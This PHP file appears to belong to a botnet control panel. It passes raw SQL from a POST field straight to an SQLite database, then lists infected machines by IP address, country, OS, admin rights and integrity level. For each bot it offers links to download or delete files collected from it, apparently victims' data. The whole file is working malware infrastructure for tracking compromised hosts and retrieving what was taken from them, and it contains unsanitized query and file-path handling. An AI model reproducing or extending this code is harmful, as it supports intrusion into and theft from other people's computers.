<?php
include('global.php');
if (!empty($_POST['query']))
{
    $db = new SQLite3('info/info.db');
    $result = $db->query($_POST['query']);
    while ($row = $result->fetchArray())
    {
        $bot_id = $row['BOT_ID'];
        $date = gmdate("H:i:s d-m-Y", $row['timestamp']);
        $file = glob("files/*$bot_id*")[0];
        echo "<tr class=\"table-item\">";
        echo "<td>$bot_id</td>";
        echo "<td>{$row['BOT_IP']}</td>";
        echo "<td>{$row['country']}</td>";
        echo "<td>{$row['OS_NAME']}</td>";
        echo "<td>{$row['X64']}</td>";
        echo "<td>{$row['IS_ADMIN']}</td>";
        echo "<td>{$row['INTEGRITY_LEVEL']}</td>";
        echo "<td>$date</td>";
        if ($file)
        {
            echo "<td><a href=\"download.php?file=$file\" class=\"table-button\"><i class=\"fas fa-download\"></i></a> ";
            echo "<a href=\"delete.php?bot_id=$bot_id&file=$file\" class=\"table-button\"><i class=\"fas fa-trash-alt\"></i></a></td>";
        }
        echo '</tr>';
    }
}
?>